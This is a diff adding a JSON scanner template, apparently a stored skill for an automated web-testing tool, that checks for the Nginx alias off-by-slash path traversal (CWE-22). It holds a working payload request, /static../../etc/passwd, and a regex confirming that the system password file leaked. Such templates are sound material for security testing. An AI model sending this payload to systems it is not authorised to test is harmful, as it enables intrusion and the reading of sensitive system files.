@@ -1,0 +1,35 @@
+{
+  "name": "web/Nginx alias traversal off-by-slash",
+  "description": "[god] Nginx alias off-by-slash traversal (CWE-22; Orange Tsai Black Hat 2018 'Breaking Parser Logic', Invicti alias_traversal, bayotop/off-by-slash, HackerOne nodejs.org): location /static + alias .../static/ lets /static../../etc/passwd escape the alias root. Keywords: nginx alias off-by-slash misconfiguration traversal parser logic location block. ctrl: patched/correct alias config 404s the escape -> not falsified. base_url = site root (copy skill to the discovered location prefix).",
+  "cwe": "CWE-22",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/static../../etc/passwd"
+    },
+    "baseline": {
+      "method": "GET",
+      "url": "{{base_url}}/static/style.css"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "root:[a-z*]{1,12}:0:0"
+    },
+    {
+      "type": "status",
+      "request": "baseline",
+      "equals": 200
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "6bf943e846e8",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
